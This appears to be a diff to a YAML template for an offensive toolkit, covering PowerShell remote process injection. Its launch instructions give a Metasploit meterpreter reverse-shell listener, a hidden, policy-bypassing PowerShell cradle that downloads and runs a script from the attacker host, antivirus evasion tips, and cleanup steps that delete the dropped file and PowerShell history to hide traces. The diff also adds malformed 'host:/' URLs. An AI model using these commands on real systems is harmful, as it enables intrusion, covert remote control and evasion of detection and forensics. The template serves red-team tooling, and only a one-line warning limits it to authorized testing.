@@ -1,19 +1,19 @@
 meta:
-  name: "Remote Process Injection (PowerShell)"
+  name: "Remote Process Injection (PowerShell)*"
   category: "Process Injection"
   description: |
     PowerShell-based remote process injection using classic CreateRemoteThread technique.
-    
+
     Features:
     - Dynamic API resolution via reflection (no direct P/Invoke)
     - Targets any running process by name
     - Uses UnsafeNativeMethods to access Windows APIs
     - Classic injection pattern: OpenProcess -> VirtualAllocEx -> WriteProcessMemory -> CreateRemoteThread
-    
+
     This technique is useful for environments where PowerShell is available but
     compiled executables are restricted. The script uses reflection to dynamically
     resolve Windows API functions, avoiding static signatures.
-    
+
     WARNING: For authorized security testing only!
 
   effectiveness: medium
@@ -85,37 +85,54 @@ output:
   compile:
     enabled: false
   launch_instructions: |
-    PowerShell Remote Process Injection - Launch Instructions
+    # Start Listener
 
-    Start Listener:
-    $ msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
+    ```bash
+    msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
+    ```
 
-    Transfer and Execute (In-Memory):
-    $ powershell -ep bypass -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://{{ lhost }}/{{ output_file }}')"
+    # Transfer and Execute (In-Memory)
 
-    Alternative (File-Based):
-    $ python3 -m http.server 80
-    $ powershell -ep bypass -c "IWR -Uri http://{{ lhost }}/{{ output_file }} -OutFile {{ output_file }}; .\{{ output_file }}"
+    ```powershell
+    powershell -ep bypass -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://{{ lhost }}:/{{ output_file }}')"
+    ```
 
-    Notes:
-    - Target process: {{ target_process }} (must be running on target)
+    # Alternative (File-Based)
+
+    **Attacker:**
+    ```bash
+    python3 -m http.server 80
+    ```
+
+    **Target:**
+    ```powershell
+    powershell -ep bypass -c "IWR -Uri http://{{ lhost }}:/{{ output_file }} -OutFile {{ output_file }}; .\{{ output_file }}"
+    ```
+
+    # Notes
+
+    - Target process: `{{ target_process }}` (must be running on target)
     - Uses reflection to dynamically resolve Windows APIs (VirtualAllocEx, WriteProcessMemory, CreateRemoteThread)
     - No static P/Invoke signatures (evades some AV)
-    - EXITFUNC=thread ensures clean exit without crashing {{ target_process }}
+    - `EXITFUNC=thread` ensures clean exit without crashing `{{ target_process }}`
     - Injects into existing process (not spawning new process)
     - Requires matching architecture (x64 payload → x64 process)
     - May require administrative privileges depending on target process integrity level
     - PowerShell Script Block Logging will record execution (Event ID 4104)
 
-    Troubleshooting:
-    - Injection fails: Verify target process running with Get-Process {{ target_process }}
-    - Process not found: Try alternative targets (notepad, explorer, chrome, msedge)
-    - No connection: Check firewall rules on attacker (allow {{ lport }}/tcp)
-    - AV blocks: Obfuscate script with Invoke-Obfuscation or encode with -EncodedCommand
-    - Access Denied: Target process may be protected (PPL) or running at higher integrity level
-    - Sysmon Event ID 8 (CreateRemoteThread) will fire on injection
+    # Troubleshooting
 
-    Cleanup:
-    On target:
-    $ Remove-Item {{ output_file }} -Force -ErrorAction SilentlyContinue
-    $ Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
+    - **Injection fails:** Verify target process running with `Get-Process {{ target_process }}`
+    - **Process not found:** Try alternative targets (notepad, explorer, chrome, msedge)
+    - **No connection:** Check firewall rules on attacker (allow `{{ lport }}/tcp`)
+    - **AV blocks:** Obfuscate script with Invoke-Obfuscation or encode with -EncodedCommand
+    - **Access Denied:** Target process may be protected (PPL) or running at higher integrity level
+    - **Sysmon Event ID 8** (CreateRemoteThread) will fire on injection
+
+    # Cleanup
+
+    **Target:**
+    ```powershell
+    Remove-Item {{ output_file }} -Force -ErrorAction SilentlyContinue
+    Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
+    ```
